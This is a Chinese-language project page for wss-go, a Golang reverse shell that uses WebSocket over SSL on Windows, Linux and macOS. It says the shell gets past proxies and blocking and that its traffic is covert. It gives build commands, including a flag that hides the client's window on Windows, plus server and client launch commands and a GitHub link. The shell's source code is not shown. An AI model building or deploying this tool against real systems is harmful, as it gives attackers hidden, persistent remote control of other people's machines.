一款使用 Golang 编写的 Websocket with SSL 的反向 Shell。

适用于Windows, Linux, MacOS。

## 原理

使用 Websocket 进行通信，并使用 SSL 证书进行加密。

## 特性

握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。

使用 SSL 证书进行加密。

数据格式比较轻量，性能开销小，通信高效隐蔽。

## 使用方法

### Windows

    
    
    go env -w GOOS=windows
    go build -o wssServer server/server.go
    go build -o wssClient -ldflags -H=windowsgui -ldflags "-s -w" client/client.go
    

### 截屏

![](https://image.3001.net/images/20210829/1630231537_612b5bf14df37bde005d0.png!small)![](https://image.3001.net/images/20210829/1630231544_612b5bf83084c6e1b97e7.png!small)

### MacOS & Linux

    
    
    go env -w GOOS=darwin/linux
    go build -o wssServer server/server.go
    go build -o wssClient client/client.go
    ./wssServer -addr 0.0.0.0:443
    ./wssClient -addr 127.0.0.1:443
    

### 截屏

![](https://image.3001.net/images/20210829/1630231549_612b5bfda85ac5e12d676.png!small)

## 下载地址

> <https://github.com/piaolin/wss-go>

## 待办

RSA & AES

